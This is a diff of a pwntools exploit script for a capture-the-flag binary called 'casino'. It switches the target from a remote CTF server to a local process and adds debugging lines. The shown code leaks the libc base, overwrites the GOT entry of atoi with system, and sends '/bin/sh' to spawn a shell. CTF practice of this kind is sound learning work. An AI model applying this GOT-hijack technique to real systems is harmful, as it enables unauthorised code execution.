@@ -28,8 +28,8 @@ libc_base_addr = 0
 print(hex(binsh_offset))
 print(hex(system_offset))
 
-# r = process("./casino")
-r = remote('edu-ctf.csie.org', 10176)
+r = process("./casino")
+# r = remote('edu-ctf.csie.org', 10176)
 r.sendlineafter('name: ', name)
 r.sendlineafter('age: ', '87')
 
@@ -112,6 +112,8 @@ while step < 7:
     # Step 5: Hijack GOT table of atoi, change it to system
     elif step == 5:
         libc_base_addr = u64(r.recv(6) + '\0\0') - 0x21ab0
+        print('libc_base_addr ', hex(libc_base_addr))
+
         for i in range(0, 6):
             r_out = 'Chose the number ' + str(i) + ': '
             r.sendlineafter(r_out, str(i))
@@ -136,7 +138,7 @@ while step < 7:
         r_out = 'Chose the number 0:'
         # hijack = libc_base_addr + binsh_offset # --> strange bug, PWN but no flag
         # print(hex(hijack), ' = ', hijack)
-        # pause()
+        pause()
         hijack= '/bin/sh' # --> PWN and with flag
         r.sendlineafter(r_out, str(hijack))
         print('finished sending number and payload for step  %d: ' % (step))
